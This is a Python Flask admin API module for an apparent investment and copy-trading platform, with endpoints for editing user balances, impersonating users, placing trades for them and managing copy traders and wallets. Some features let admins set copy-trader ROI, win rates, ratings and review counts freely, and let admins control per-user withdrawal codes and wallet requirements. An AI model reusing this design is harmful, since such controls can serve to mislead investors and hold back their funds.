import time
import os
import secrets
import uuid
import json as _json
import jwt
import base64
from decimal import Decimal
from datetime import datetime
from flask import Blueprint, request, jsonify, g
from ..db import get_db
from ..auth import roles_required, hash_password

bp = Blueprint("admin", __name__, url_prefix="/api/admin")


# ============================================================
# HELPERS
# ============================================================

def _generate_code():
    """6-digit numeric code, no leading zero. Used by the
    withdrawal-approval flow to mint a fresh confirmation code."""
    return str(secrets.randbelow(900000) + 100000)


def _audit(db, actor_id, action, target=None):
    db.execute(
        "INSERT INTO audit_log (id, actor_id, action, target) VALUES (?, ?, ?, ?)",
        (str(uuid.uuid4()), actor_id, action, target),
    )


def _get_user_or_404(db, user_id):
    return db.execute(
        """SELECT id, email, username, full_name, phone, country,
                  role, cash_balance, created_at,
                  blocked, signal_strength, trade_limit,
                  withdrawal_code, plan, upgraded_at, trading_disabled
           FROM users WHERE id = ?""",
        (user_id,)
    ).fetchone()


def _read_setting(db, key, default=None):
    row = db.execute(
        "SELECT value FROM platform_settings WHERE key = ?", (key,)
    ).fetchone()
    if not row:
        return default
    try:
        return _json.loads(row["value"])
    except Exception:
        return default


def _write_setting(db, key, value, actor_id):
    db.execute(
        """INSERT INTO platform_settings (key, value, updated_by, updated_at)
           VALUES (?, ?, ?, datetime('now'))
           ON CONFLICT(key) DO UPDATE SET
             value = excluded.value,
             updated_by = excluded.updated_by,
             updated_at = datetime('now')""",
        (key, _json.dumps(value), actor_id)
    )


# ============================================================
# USERS — list, detail, edit, delete
# ============================================================

@bp.get("/users")
@roles_required("admin")
def list_users():
    db = get_db()
    rows = db.execute(
        """SELECT id, email, username, full_name, phone, country,
                  role, cash_balance, created_at,
                  blocked, signal_strength, trade_limit,
                  withdrawal_code, plan, upgraded_at, trading_disabled
           FROM users ORDER BY created_at DESC"""
    ).fetchall()
    db.close()
    return jsonify([dict(r) for r in rows])


@bp.get("/users/<user_id>")
@roles_required("admin")
def get_user(user_id):
    db = get_db()
    row = _get_user_or_404(db, user_id)
    if not row:
        db.close()
        return jsonify({"error": "User not found"}), 404

    transfers = db.execute(
        """SELECT id, direction, amount_usd, status, requested_at
           FROM transfers WHERE user_id = ?
           ORDER BY requested_at DESC LIMIT 20""",
        (user_id,)
    ).fetchall()

    admin_trades = db.execute(
        """SELECT id, symbol, side, qty, price_usd, status, created_at
           FROM admin_trades WHERE user_id = ?
           ORDER BY created_at DESC LIMIT 20""",
        (user_id,)
    ).fetchall()

    impersonations = db.execute(
        """SELECT id, admin_id, started_at, ended_at, actions_taken
           FROM impersonation_log WHERE user_id = ?
           ORDER BY started_at DESC LIMIT 20""",
        (user_id,)
    ).fetchall()

    db.close()
    return jsonify({
        "user": dict(row),
        "transfers": [dict(r) for r in transfers],
        "admin_trades": [dict(r) for r in admin_trades],
        "impersonations": [dict(r) for r in impersonations],
    })


@bp.patch("/users/<user_id>")
@roles_required("admin")
def edit_user(user_id):
    body = request.get_json(silent=True) or {}

    editable = ["full_name", "email", "phone", "country", "username",
                "signal_strength", "trade_limit", "withdrawal_code", "plan"]
    updates = {k: body[k] for k in editable if k in body}
    if not updates:
        return jsonify({"error": "No editable fields provided"}), 400

    set_clause = ", ".join(f"{k} = ?" for k in updates)
    values = list(updates.values()) + [user_id]

    db = get_db()
    user = _get_user_or_404(db, user_id)
    if not user:
        db.close()
        return jsonify({"error": "User not found"}), 404

    try:
        db.execute(f"UPDATE users SET {set_clause} WHERE id = ?", values)
        _audit(db, g.user["id"], f"user_edit:{','.join(updates.keys())}", target=user_id)
        db.commit()
    except Exception as e:
        db.close()
        return jsonify({"error": f"Update failed: {e}"}), 500

    db.close()
    return jsonify({"ok": True})


@bp.delete("/users/<user_id>")
@roles_required("admin")
def delete_user(user_id):
    if user_id == g.user["id"]:
        return jsonify({"error": "You cannot delete your own account"}), 400

    db = get_db()
    user = _get_user_or_404(db, user_id)
    if not user:
        db.close()
        return jsonify({"error": "User not found"}), 404

    try:
        db.execute("BEGIN IMMEDIATE")
        _audit(db, g.user["id"], "user_delete", target=user_id)
        for table in ("notifications", "transfers", "bank_links",
                      "wallets", "copied_traders", "paper_positions",
                      "paper_trades", "wallet_topups", "kyc_submissions",
                      "admin_trades", "impersonation_log"):
            try:
                db.execute(f"DELETE FROM {table} WHERE user_id = ?", (user_id,))
            except Exception:
                pass
        db.execute("DELETE FROM users WHERE id = ?", (user_id,))
        db.commit()
    except Exception as e:
        try: db.execute("ROLLBACK")
        except Exception: pass
        db.close()
        return jsonify({"error": f"Delete failed: {e}"}), 500

    db.close()
    return jsonify({"ok": True})


# ============================================================
# NOTIFICATIONS — admin can send to a single user or broadcast
# ============================================================

@bp.post("/users/<user_id>/notify")
@roles_required("admin", "support")
def notify_user(user_id):
    body = request.get_json(silent=True) or {}
    title = (body.get("title") or "").strip()
    message = (body.get("body") or "").strip()
    kind = (body.get("kind") or "admin").strip() or "admin"

    if not title:
        return jsonify({"error": "Title is required"}), 400
    if len(title) > 200:
        return jsonify({"error": "Title is too long (max 200)"}), 400
    if len(message) > 4000:
        return jsonify({"error": "Body is too long (max 4000)"}), 400

    db = get_db()
    user = db.execute("SELECT id, email FROM users WHERE id = ?", (user_id,)).fetchone()
    if not user:
        db.close()
        return jsonify({"error": "User not found"}), 404

    notif_id = str(uuid.uuid4())
    db.execute(
        """INSERT INTO notifications (id, user_id, kind, title, body)
           VALUES (?, ?, ?, ?, ?)""",
        (notif_id, user_id, kind, title, message or None),
    )
    _audit(db, g.user["id"], "notify_user", user_id)
    db.commit()
    db.close()

    return jsonify({"ok": True, "id": notif_id})


@bp.post("/users/notify-all")
@roles_required("admin")
def notify_all_users():
    body = request.get_json(silent=True) or {}
    title = (body.get("title") or "").strip()
    message = (body.get("body") or "").strip()
    kind = (body.get("kind") or "admin").strip() or "admin"
    include_admins = bool(body.get("include_admins", False))

    if not title:
        return jsonify({"error": "Title is required"}), 400
    if len(title) > 200:
        return jsonify({"error": "Title is too long (max 200)"}), 400
    if len(message) > 4000:
        return jsonify({"error": "Body is too long (max 4000)"}), 400

    db = get_db()
    if include_admins:
        rows = db.execute("SELECT id FROM users").fetchall()
    else:
        rows = db.execute("SELECT id FROM users WHERE role = 'user'").fetchall()

    if not rows:
        db.close()
        return jsonify({"error": "No recipients"}), 400

    now = datetime.utcnow().isoformat()
    payload = [
        (str(uuid.uuid4()), r["id"], kind, title, message or None, now)
        for r in rows
    ]
    db.executemany(
        """INSERT INTO notifications (id, user_id, kind, title, body, created_at)
           VALUES (?, ?, ?, ?, ?, ?)""",
        payload,
    )
    _audit(db, g.user["id"], f"notify_all:{len(payload)}", None)
    db.commit()
    db.close()

    return jsonify({"ok": True, "sent": len(payload)})


# ============================================================
# USER ROLE MANAGEMENT
# ============================================================

@bp.post("/users/<user_id>/promote")
@roles_required("admin")
def promote_user(user_id):
    db = get_db()
    user = db.execute(
        "SELECT id, email, role FROM users WHERE id = ?", (user_id,)
    ).fetchone()
    if not user:
        db.close()
        return jsonify({"error": "User not found"}), 404

    if user["id"] == g.user["id"]:
        db.close()
        return jsonify({"error": "Cannot change your own role"}), 400

    if user["role"] == "admin":
        db.close()
        return jsonify({"error": "User is already an admin"}), 409

    db.execute("UPDATE users SET role = 'admin' WHERE id = ?", (user_id,))
    _audit(db, g.user["id"], "user_promote", user_id)
    db.commit()
    db.close()
    return jsonify({"ok": True, "role": "admin"})


@bp.post("/users/<user_id>/demote")
@roles_required("admin")
def demote_user(user_id):
    db = get_db()
    user = db.execute(
        "SELECT id, email, role FROM users WHERE id = ?", (user_id,)
    ).fetchone()
    if not user:
        db.close()
        return jsonify({"error": "User not found"}), 404

    if user["id"] == g.user["id"]:
        db.close()
        return jsonify({"error": "Cannot change your own role"}), 400

    if user["role"] != "admin":
        db.close()
        return jsonify({"error": "User is not an admin"}), 409

    admin_count = db.execute(
        "SELECT COUNT(*) AS n FROM users WHERE role = 'admin'"
    ).fetchone()["n"]
    if admin_count <= 1:
        db.close()
        return jsonify({"error": "Cannot demote the last remaining admin"}), 400

    db.execute("UPDATE users SET role = 'user' WHERE id = ?", (user_id,))
    _audit(db, g.user["id"], "user_demote", user_id)
    db.commit()
    db.close()
    return jsonify({"ok": True, "role": "user"})


@bp.get("/admins")
@roles_required("admin", "support")
def list_admins():
    db = get_db()
    rows = db.execute(
        """SELECT id, email, full_name, role, created_at
           FROM users
           WHERE role IN ('admin', 'support')
           ORDER BY role DESC, created_at ASC"""
    ).fetchall()
    db.close()
    return jsonify([dict(r) for r in rows])


# ============================================================
# BALANCE — credit / debit
# ============================================================

@bp.post("/users/<user_id>/credit")
@roles_required("admin")
def credit_user_balance(user_id):
    body = request.get_json(silent=True) or {}
    try:
        amount = Decimal(str(body.get("amount") or "0"))
    except Exception:
        return jsonify({"error": "Invalid amount"}), 400

    if amount == 0:
        return jsonify({"error": "Amount cannot be zero"}), 400

    direction = body.get("direction", "credit")
    reason    = (body.get("reason") or "").strip() or None

    if direction not in ("credit", "debit"):
        return jsonify({"error": "direction must be 'credit' or 'debit'"}), 400

    db = get_db()
    user = db.execute(
        "SELECT id, cash_balance FROM users WHERE id = ?", (user_id,)
    ).fetchone()
    if not user:
        db.close()
        return jsonify({"error": "User not found"}), 404

    current = Decimal(str(user["cash_balance"] or "0"))
    delta   = amount if direction == "credit" else -amount
    new_bal = current + delta
    if new_bal < 0:
        db.close()
        return jsonify({"error": "Insufficient balance for debit"}), 400

    try:
        db.execute("BEGIN IMMEDIATE")
        db.execute(
            "UPDATE users SET cash_balance = ? WHERE id = ?",
            (f"{new_bal:.2f}", user_id)
        )
        _audit(db, g.user["id"], f"balance_{direction}:{amount}", target=user_id)
        try:
            db.execute(
                """INSERT INTO notifications (id, user_id, kind, title, body)
                   VALUES (?, ?, 'transfer', ?, ?)""",
                (str(uuid.uuid4()), user_id,
                 f"Balance {'credited' if direction == 'credit' else 'debited'}",
                 f"Your account was {'credited' if direction == 'credit' else 'debited'} "
                 f"${amount}." + (f" Reason: {reason}" if reason else ""))
            )
        except Exception:
            pass
        db.commit()
    except Exception as e:
        try: db.execute("ROLLBACK")
        except Exception: pass
        db.close()
        return jsonify({"error": f"Failed: {e}"}), 500

    db.close()
    return jsonify({"ok": True, "balance": f"{new_bal:.2f}"})


# ============================================================
# BLOCK / UNBLOCK
# ============================================================

@bp.post("/users/<user_id>/block")
@roles_required("admin")
def block_user(user_id):
    body = request.get_json(silent=True) or {}
    blocked = 1 if body.get("blocked", True) else 0

    db = get_db()
    user = _get_user_or_404(db, user_id)
    if not user:
        db.close()
        return jsonify({"error": "User not found"}), 404

    db.execute("UPDATE users SET blocked = ? WHERE id = ?", (blocked, user_id))
    _audit(db, g.user["id"], "user_block" if blocked else "user_unblock", target=user_id)
    db.commit()
    db.close()
    return jsonify({"ok": True, "blocked": bool(blocked)})


# ============================================================
# PASSWORD RESET
# ============================================================

@bp.post("/users/<user_id>/reset-password")
@roles_required("admin")
def reset_password(user_id):
    body = request.get_json(silent=True) or {}
    new_password = body.get("new_password") or ""

    if len(new_password) < 10:
        return jsonify({"error": "Password must be at least 10 characters"}), 400

    db = get_db()
    user = _get_user_or_404(db, user_id)
    if not user:
        db.close()
        return jsonify({"error": "User not found"}), 404

    db.execute(
        "UPDATE users SET password_hash = ? WHERE id = ?",
        (hash_password(new_password), user_id)
    )
    _audit(db, g.user["id"], "password_reset", target=user_id)
    db.commit()
    db.close()
    return jsonify({"ok": True})


# ============================================================
# IMPERSONATION
# ============================================================

@bp.post("/users/<user_id>/impersonate")
@roles_required("admin")
def impersonate_user(user_id):
    db = get_db()
    user = _get_user_or_404(db, user_id)
    if not user:
        db.close()
        return jsonify({"error": "User not found"}), 404

    payload = {
        "id": user["id"],
        "email": user["email"],
        "role": user["role"],
        "impersonated_by": g.user["id"],
        "exp": int(time.time()) + 1800,
    }
    token = jwt.encode(payload, os.environ["JWT_SECRET"], algorithm="HS256")

    imp_id = str(uuid.uuid4())
    db.execute(
        """INSERT INTO impersonation_log (id, admin_id, user_id)
           VALUES (?, ?, ?)""",
        (imp_id, g.user["id"], user_id)
    )
    _audit(db, g.user["id"], "impersonate_start", target=user_id)
    db.commit()
    db.close()

    return jsonify({"token": token, "expires_in": 1800, "impersonation_id": imp_id})


# ============================================================
# ADMIN-PLACED TRADE
# ============================================================

@bp.post("/users/<user_id>/trade")
@roles_required("admin")
def trade_for_user(user_id):
    body = request.get_json(silent=True) or {}
    symbol = (body.get("symbol") or "").upper()
    side   = (body.get("side") or "").upper()
    try:
        qty = float(body.get("qty") or 0)
    except (TypeError, ValueError):
        return jsonify({"error": "Invalid qty"}), 400

    if not symbol or side not in ("BUY", "SELL") or qty <= 0:
        return jsonify({"error": "symbol, side, qty required"}), 400

    db = get_db()
    user = _get_user_or_404(db, user_id)
    if not user:
        db.close()
        return jsonify({"error": "User not found"}), 404

    trade_id = str(uuid.uuid4())
    db.execute(
        """INSERT INTO admin_trades
           (id, user_id, admin_id, symbol, side, qty, notes)
           VALUES (?, ?, ?, ?, ?, ?, ?)""",
        (trade_id, user_id, g.user["id"], symbol, side,
         f"{qty}", body.get("notes"))
    )
    _audit(db, g.user["id"], f"admin_trade:{symbol}:{side}:{qty}", target=user_id)
    db.commit()
    db.close()
    return jsonify({"ok": True, "trade_id": trade_id}), 201


# ============================================================
# KYC QUEUE
# ============================================================

@bp.get("/kyc-queue")
@roles_required("admin", "support")
def kyc_queue():
    db = get_db()
    rows = db.execute(
        """SELECT k.*, u.email, u.full_name FROM kyc_submissions k
           JOIN users u ON u.id = k.user_id
           ORDER BY k.updated_at DESC"""
    ).fetchall()
    db.close()
    return jsonify([dict(r) for r in rows])


@bp.patch("/kyc-queue/<submission_id>/sync-status")
@roles_required("admin")
def sync_kyc_status(submission_id):
    body = request.get_json(silent=True) or {}
    status = body.get("status")
    if status not in ("submitted", "pending_review", "approved", "rejected"):
        return jsonify({"error": "Invalid status"}), 400

    db = get_db()
    db.execute(
        "UPDATE kyc_submissions SET alpaca_account_status = ?, status = ?, updated_at = datetime('now') WHERE id = ?",
        (body.get("alpaca_account_status"), status, submission_id),
    )
    _audit(db, g.user["id"], "kyc_status_sync", submission_id)
    db.commit()
    db.close()
    return jsonify({"ok": True})


# ============================================================
# CONTENT PAGES
# ============================================================

@bp.get("/content")
@roles_required("admin", "support")
def list_content():
    db = get_db()
    rows = db.execute("SELECT * FROM content_pages ORDER BY slug").fetchall()
    db.close()
    return jsonify([dict(r) for r in rows])


@bp.put("/content/<slug>")
@roles_required("admin")
def upsert_content(slug):
    body = request.get_json(silent=True) or {}
    title, body_md = body.get("title"), body.get("body_markdown")
    if not title or not body_md:
        return jsonify({"error": "title and body_markdown required"}), 400

    db = get_db()
    db.execute(
        """INSERT INTO content_pages (slug, title, body_markdown, updated_by, updated_at)
           VALUES (?, ?, ?, ?, datetime('now'))
           ON CONFLICT(slug) DO UPDATE SET title = excluded.title, body_markdown = excluded.body_markdown,
             updated_by = excluded.updated_by, updated_at = datetime('now')""",
        (slug, title, body_md, g.user["id"]),
    )
    _audit(db, g.user["id"], "content_update", slug)
    db.commit()
    db.close()
    return jsonify({"ok": True})


# ============================================================
# COMPLIANCE DOCS
# ============================================================

@bp.get("/compliance-docs")
@roles_required("admin", "support")
def list_docs():
    db = get_db()
    rows = db.execute("SELECT * FROM compliance_documents ORDER BY uploaded_at DESC").fetchall()
    db.close()
    return jsonify([dict(r) for r in rows])


@bp.post("/compliance-docs")
@roles_required("admin")
def add_doc():
    body = request.get_json(silent=True) or {}
    title, category, file_path = body.get("title"), body.get("category"), body.get("file_path")
    if not title or not category or not file_path:
        return jsonify({"error": "title, category, and file_path are required"}), 400

    db = get_db()
    doc_id = str(uuid.uuid4())
    db.execute(
        "INSERT INTO compliance_documents (id, title, category, file_path, uploaded_by) VALUES (?, ?, ?, ?, ?)",
        (doc_id, title, category, file_path, g.user["id"]),
    )
    _audit(db, g.user["id"], "compliance_doc_upload", doc_id)
    db.commit()
    db.close()
    return jsonify({"id": doc_id}), 201


# ============================================================
# SUPPORT TICKETS
# ============================================================

@bp.get("/support-tickets")
@roles_required("admin", "support")
def list_tickets():
    db = get_db()
    rows = db.execute(
        """SELECT t.*, u.email, u.full_name FROM support_tickets t
           JOIN users u ON u.id = t.user_id
           ORDER BY t.updated_at DESC"""
    ).fetchall()
    db.close()
    return jsonify([dict(r) for r in rows])


@bp.get("/support-tickets/<ticket_id>/replies")
@roles_required("admin", "support")
def ticket_replies(ticket_id):
    db = get_db()
    rows = db.execute(
        "SELECT * FROM ticket_replies WHERE ticket_id = ? ORDER BY created_at ASC", (ticket_id,)
    ).fetchall()
    db.close()
    return jsonify([dict(r) for r in rows])


@bp.post("/support-tickets/<ticket_id>/replies")
@roles_required("admin", "support")
def reply_ticket(ticket_id):
    body = request.get_json(silent=True) or {}
    message = body.get("message")
    if not message:
        return jsonify({"error": "message is required"}), 400

    db = get_db()
    reply_id = str(uuid.uuid4())
    db.execute(
        "INSERT INTO ticket_replies (id, ticket_id, author_id, message) VALUES (?, ?, ?, ?)",
        (reply_id, ticket_id, g.user["id"], message),
    )
    db.execute("UPDATE support_tickets SET updated_at = datetime('now') WHERE id = ?", (ticket_id,))
    _audit(db, g.user["id"], "ticket_reply", ticket_id)
    db.commit()
    db.close()
    return jsonify({"id": reply_id}), 201


@bp.patch("/support-tickets/<ticket_id>")
@roles_required("admin", "support")
def update_ticket(ticket_id):
    body = request.get_json(silent=True) or {}
    db = get_db()
    db.execute(
        """UPDATE support_tickets SET status = COALESCE(?, status),
           assigned_to = COALESCE(?, assigned_to), updated_at = datetime('now') WHERE id = ?""",
        (body.get("status"), body.get("assigned_to"), ticket_id),
    )
    _audit(db, g.user["id"], "ticket_update", ticket_id)
    db.commit()
    db.close()
    return jsonify({"ok": True})


# ============================================================
# LOANS
# ============================================================

@bp.get("/loans")
@roles_required("admin", "support")
def list_loans():
    db = get_db()
    rows = db.execute(
        """SELECT l.*, u.email, u.full_name
           FROM loans l JOIN users u ON u.id = l.user_id
           ORDER BY l.created_at DESC"""
    ).fetchall()
    db.close()
    return jsonify([dict(r) for r in rows])


@bp.patch("/loans/<loan_id>")
@roles_required("admin", "support")
def update_loan(loan_id):
    body = request.get_json(silent=True) or {}
    status = body.get("status")
    reason = body.get("reason")

    if status not in ("pending_review", "pre_qualified", "forwarded", "approved", "rejected"):
        return jsonify({"error": "Invalid status"}), 400

    db = get_db()
    db.execute(
        """UPDATE loans
           SET status = ?, admin_notes = COALESCE(?, admin_notes),
               reviewed_by = ?, reviewed_at = datetime('now')
           WHERE id = ?""",
        (status, reason, g.user["id"], loan_id),
    )
    _audit(db, g.user["id"], "loan_status_update", loan_id)
    db.commit()
    db.close()
    return jsonify({"ok": True})


# ============================================================
# COPY TRADERS
# ============================================================

@bp.get("/copy-traders")
@roles_required("admin", "support")
def list_copy_traders():
    db = get_db()
    rows = db.execute(
        "SELECT * FROM copy_traders ORDER BY display_name ASC"
    ).fetchall()
    db.close()
    return jsonify([dict(r) for r in rows])


@bp.post("/copy-traders")
@roles_required("admin")
def create_copy_trader():
    body = request.get_json(silent=True) or {}
    display_name = (body.get("display_name") or "").strip()
    if not display_name:
        return jsonify({"error": "display_name is required"}), 400

    trader_id = str(uuid.uuid4())
    db = get_db()
    db.execute(
        """INSERT INTO copy_traders
           (id, display_name, bio, avatar_url, external_id, provider,
            roi, win_rate, total_trades, max_followers, risk_level, elite, active,
            tier, rating, reviews, equity, minimum_investment)
           VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
        (
            trader_id,
            display_name,
            body.get("bio"),
            body.get("avatar_url"),
            body.get("external_id"),
            body.get("provider"),
            body.get("roi"),
            body.get("win_rate"),
            int(body.get("total_trades") or 0),
            body.get("max_followers"),
            body.get("risk_level", "low"),
            1 if body.get("elite") else 0,
            1 if body.get("active", True) else 0,
            body.get("tier", "PRO"),
            float(body.get("rating") or 5.0),
            int(body.get("reviews") or 0),
            float(body.get("equity") or 0),
            float(body.get("minimum_investment") or 0),
        ),
    )
    _audit(db, g.user["id"], "copy_trader_create", trader_id)
    db.commit()
    db.close()
    return jsonify({"id": trader_id}), 201


@bp.patch("/copy-traders/<trader_id>")
@roles_required("admin")
def update_copy_trader(trader_id):
    body = request.get_json(silent=True) or {}
    db = get_db()
    db.execute(
        """UPDATE copy_traders
           SET display_name = COALESCE(?, display_name),
               bio = COALESCE(?, bio),
               avatar_url = COALESCE(?, avatar_url),
               external_id = COALESCE(?, external_id),
               provider = COALESCE(?, provider),
               roi = COALESCE(?, roi),
               win_rate = COALESCE(?, win_rate),
               total_trades = COALESCE(?, total_trades),
               max_followers = COALESCE(?, max_followers),
               risk_level = COALESCE(?, risk_level),
               elite = COALESCE(?, elite),
               active = COALESCE(?, active),
               tier = COALESCE(?, tier),
               rating = COALESCE(?, rating),
               reviews = COALESCE(?, reviews),
               equity = COALESCE(?, equity),
               minimum_investment = COALESCE(?, minimum_investment),
               updated_at = datetime('now')
           WHERE id = ?""",
        (
            body.get("display_name"),
            body.get("bio"),
            body.get("avatar_url"),
            body.get("external_id"),
            body.get("provider"),
            body.get("roi"),
            body.get("win_rate"),
            body.get("total_trades"),
            body.get("max_followers"),
            body.get("risk_level"),
            (1 if body.get("elite") else 0) if "elite" in body else None,
            (1 if body.get("active") else 0) if "active" in body else None,
            body.get("tier"),
            body.get("rating"),
            body.get("reviews"),
            body.get("equity"),
            body.get("minimum_investment"),
            trader_id,
        ),
    )
    _audit(db, g.user["id"], "copy_trader_update", trader_id)
    db.commit()
    db.close()
    return jsonify({"ok": True})


@bp.delete("/copy-traders/<trader_id>")
@roles_required("admin")
def delete_copy_trader(trader_id):
    db = get_db()
    db.execute("DELETE FROM copy_traders WHERE id = ?", (trader_id,))
    _audit(db, g.user["id"], "copy_trader_delete", trader_id)
    db.commit()
    db.close()
    return jsonify({"ok": True})


# ============================================================
# COPY-TRADE PAYMENTS
# ============================================================

@bp.get("/copy-payments")
@roles_required("admin", "support")
def list_copy_payments():
    db = get_db()
    rows = db.execute(
        """SELECT c.id, c.user_id, c.trader_id,
                  c.status, c.payment_status,
                  c.amount_usd, c.source,
                  c.wallet_id, c.wallet_address, c.tx_hash,
                  c.started_at, c.reviewed_at, c.rejection_reason,
                  u.email AS user_email,
                  u.full_name AS user_name,
                  u.cash_balance AS user_cash_balance,
                  t.display_name AS trader_name,
                  t.minimum_investment AS trader_min,
                  r.email AS reviewer_email
           FROM copied_traders c
           JOIN users u ON u.id = c.user_id
           JOIN copy_traders t ON t.id = c.trader_id
           LEFT JOIN users r ON r.id = c.reviewed_by
           ORDER BY
             CASE c.payment_status
               WHEN 'pending_review' THEN 0
               WHEN 'settled'        THEN 1
               WHEN 'rejected'       THEN 2
               ELSE 3
             END,
             c.started_at DESC"""
    ).fetchall()
    db.close()
    return jsonify([dict(r) for r in rows])


@bp.get("/copy-payments/pending-count")
@roles_required("admin", "support")
def copy_payments_pending_count():
    db = get_db()
    row = db.execute(
        "SELECT COUNT(*) AS n FROM copied_traders WHERE payment_status = 'pending_review'"
    ).fetchone()
    db.close()
    return jsonify({"count": row["n"] if row else 0})


@bp.post("/copy-payments/<copy_id>/approve")
@roles_required("admin")
def approve_copy_payment(copy_id):
    db = get_db()
    row = db.execute(
        """SELECT id, user_id, trader_id, amount_usd, source,
                  wallet_address, tx_hash, status, payment_status
           FROM copied_traders WHERE id = ?""",
        (copy_id,)
    ).fetchone()
    if not row:
        db.close()
        return jsonify({"error": "Copy request not found"}), 404

    if row["payment_status"] != "pending_review":
        db.close()
        return jsonify({
            "error": f"This request is already '{row['payment_status']}'"
        }), 409

    amount = float(row["amount_usd"] or 0)
    if amount <= 0:
        db.close()
        return jsonify({"error": "Amount is invalid"}), 400

    try:
        db.execute("BEGIN IMMEDIATE")

        if row["source"] == "balance":
            u = db.execute(
                "SELECT cash_balance FROM users WHERE id = ?",
                (row["user_id"],)
            ).fetchone()
            current = float((u["cash_balance"] if u else 0) or 0)
            if current < amount:
                db.execute("ROLLBACK")
                db.close()
                return jsonify({
                    "error": "insufficient_balance",
                    "available": current,
                    "required": amount,
                }), 400

            db.execute(
                "UPDATE users SET cash_balance = ? WHERE id = ?",
                (f"{current - amount:.2f}", row["user_id"])
            )

        db.execute(
            """UPDATE copied_traders
               SET status = 'active',
                   payment_status = 'settled',
                   funded_at = datetime('now'),
                   reviewed_by = ?,
                   reviewed_at = datetime('now'),
                   rejection_reason = NULL
               WHERE id = ?""",
            (g.user["id"], copy_id)
        )

        try:
            db.execute(
                """INSERT INTO notifications (id, user_id, kind, title, body)
                   VALUES (?, ?, 'copy_trading', 'Copy approved', ?)""",
                (str(uuid.uuid4()), row["user_id"],
                 f"Your copy-trade request for ${amount:.2f} was approved. "
                 "Mirroring will begin once the partner is connected.")
            )
        except Exception:
            pass

        _audit(db, g.user["id"], "copy_payment_approve", copy_id)
        db.commit()
    except Exception as e:
        try: db.execute("ROLLBACK")
        except Exception: pass
        db.close()
        return jsonify({"error": f"Approval failed: {e}"}), 500

    db.close()
    return jsonify({"ok": True, "status": "active", "payment_status": "settled"})


@bp.post("/copy-payments/<copy_id>/reject")
@roles_required("admin")
def reject_copy_payment(copy_id):
    body = request.get_json(silent=True) or {}
    reason = (body.get("reason") or "").strip() or None

    db = get_db()
    row = db.execute(
        """SELECT id, user_id, amount_usd, payment_status
           FROM copied_traders WHERE id = ?""",
        (copy_id,)
    ).fetchone()
    if not row:
        db.close()
        return jsonify({"error": "Copy request not found"}), 404

    if row["payment_status"] != "pending_review":
        db.close()
        return jsonify({
            "error": f"This request is already '{row['payment_status']}'"
        }), 409

    db.execute(
        """UPDATE copied_traders
           SET status = 'rejected',
               payment_status = 'rejected',
               reviewed_by = ?,
               reviewed_at = datetime('now'),
               rejection_reason = ?
           WHERE id = ?""",
        (g.user["id"], reason, copy_id)
    )

    try:
        db.execute(
            """INSERT INTO notifications (id, user_id, kind, title, body)
               VALUES (?, ?, 'copy_trading', 'Copy request not approved', ?)""",
            (str(uuid.uuid4()), row["user_id"],
             reason or "Your copy-trade request was not approved.")
        )
    except Exception:
        pass

    _audit(db, g.user["id"], "copy_payment_reject", copy_id)
    db.commit()
    db.close()
    return jsonify({"ok": True, "status": "rejected"})


# ============================================================
# PER-USER WITHDRAWAL POLICY
# ============================================================

@bp.get("/users/<user_id>/withdrawal-policy")
@roles_required("admin", "support")
def get_user_withdrawal_policy(user_id):
    db = get_db()
    row = db.execute(
        "SELECT require_wallet_to_withdraw FROM users WHERE id = ?",
        (user_id,)
    ).fetchone()
    db.close()
    if not row:
        return jsonify({"error": "User not found"}), 404
    return jsonify({
        "require_wallet_to_withdraw": bool(row["require_wallet_to_withdraw"])
    })


@bp.put("/users/<user_id>/withdrawal-policy")
@roles_required("admin")
def set_user_withdrawal_policy(user_id):
    body = request.get_json(silent=True) or {}
    if "require_wallet_to_withdraw" not in body:
        return jsonify({"error": "require_wallet_to_withdraw is required"}), 400

    new_value = 1 if body["require_wallet_to_withdraw"] else 0

    db = get_db()
    user = db.execute("SELECT id FROM users WHERE id = ?", (user_id,)).fetchone()
    if not user:
        db.close()
        return jsonify({"error": "User not found"}), 404

    db.execute(
        "UPDATE users SET require_wallet_to_withdraw = ? WHERE id = ?",
        (new_value, user_id)
    )
    _audit(
        db, g.user["id"],
        f"user_withdrawal_policy:{new_value}",
        target=user_id
    )
    db.commit()
    db.close()

    return jsonify({
        "ok": True,
        "require_wallet_to_withdraw": bool(new_value),
    })


# ============================================================
# WALLET LINKS
# ============================================================

@bp.get("/wallet-links")
@roles_required("admin", "support")
def list_wallet_links():
    db = get_db()
    rows = db.execute(
        """SELECT w.id, w.user_id, w.wallet_id, w.address, w.chain,
                  w.status, w.linked_at, w.stored_at, w.rejection_reason,
                  w.source,
                  u.email AS user_email,
                  u.full_name AS user_name,
                  r.email AS reviewer_email
           FROM wallets w
           JOIN users u ON u.id = w.user_id
           LEFT JOIN users r ON r.id = w.reviewed_by
           ORDER BY
             CASE w.status
               WHEN 'pending_review' THEN 0
               WHEN 'stored'         THEN 1
               WHEN 'rejected'       THEN 2
               ELSE 3
             END,
             w.linked_at DESC"""
    ).fetchall()
    db.close()
    return jsonify([dict(r) for r in rows])


@bp.get("/wallet-links/pending-count")
@roles_required("admin", "support")
def wallet_links_pending_count():
    db = get_db()
    row = db.execute(
        "SELECT COUNT(*) AS n FROM wallets WHERE status = 'pending_review'"
    ).fetchone()
    db.close()
    return jsonify({"count": row["n"] if row else 0})


@bp.post("/wallet-links/<wallet_pk>/store")
@roles_required("admin")
def store_wallet_link(wallet_pk):
    db = get_db()
    row = db.execute(
        "SELECT id, user_id, wallet_id, status FROM wallets WHERE id = ?",
        (wallet_pk,)
    ).fetchone()
    if not row:
        db.close()
        return jsonify({"error": "Wallet not found"}), 404

    if row["status"] == "stored":
        db.close()
        return jsonify({"error": "Already stored"}), 409

    db.execute(
        """UPDATE wallets
           SET status = 'stored',
               stored_at = datetime('now'),
               reviewed_by = ?,
               reviewed_at = datetime('now'),
               rejection_reason = NULL
           WHERE id = ?""",
        (g.user["id"], wallet_pk)
    )

    try:
        db.execute(
            """INSERT INTO notifications (id, user_id, kind, title, body)
               VALUES (?, ?, 'wallet', 'Wallet saved', ?)""",
            (str(uuid.uuid4()), row["user_id"],
             f"Your {row['wallet_id']} address has been saved.")
        )
    except Exception:
        pass

    _audit(db, g.user["id"], "wallet_store", wallet_pk)
    db.commit()
    db.close()
    return jsonify({"ok": True, "status": "stored"})


@bp.post("/wallet-links/<wallet_pk>/reject")
@roles_required("admin")
def reject_wallet_link(wallet_pk):
    body = request.get_json(silent=True) or {}
    reason = (body.get("reason") or "").strip() or None

    db = get_db()
    row = db.execute(
